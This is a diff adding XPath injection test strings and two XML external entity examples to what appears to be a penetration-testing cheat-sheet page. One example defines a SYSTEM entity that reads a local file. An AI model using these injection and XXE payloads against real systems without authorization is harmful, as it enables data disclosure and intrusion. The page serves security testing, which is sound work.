@@ -510,6 +510,60 @@ Online:
 * [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
 * [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
 
+
+> **XPATH**
+
+{% highlight XML %}
+Query Examples
+///Member
+/Grops/Security/Member/[Name="J*"]
+///@type="0"
+
+Test Characters
+'
+"
+//
+' or '1'='1
+{% endhighlight %}
+
+
+>**External Entity XML
+
+{% highlight XML %}
+
+Example 1:
+<!DOCTYPE interestingsites[
+	<!ENTITY ISC "isc.sans.edu">
+	<!ENTITY SPL "portal.sans.org">
+	<!ENTITY GO "www.google.com">
+]>
+
+&SPL; is replace upon parsing
+
+<interestingsites>
+	<title>ISC</title>
+	<host>&SPL;</host>
+</interestingsites>
+
+Example 2:
+<?xml version="1.0"?>
+
+<!DOCTYPE root [
+<!ENTITY c SYSTEM "file://view_order.php">
+] >
+
+<order>
+	<item>
+		<name>&c;</name>
+		<amount>1</amount>
+	</item>
+</order>
+
+
+{% endhighlight %}
+
+
+
 > **Useful Tools**
 
 * [SQLMap](http://sqlmap.org)
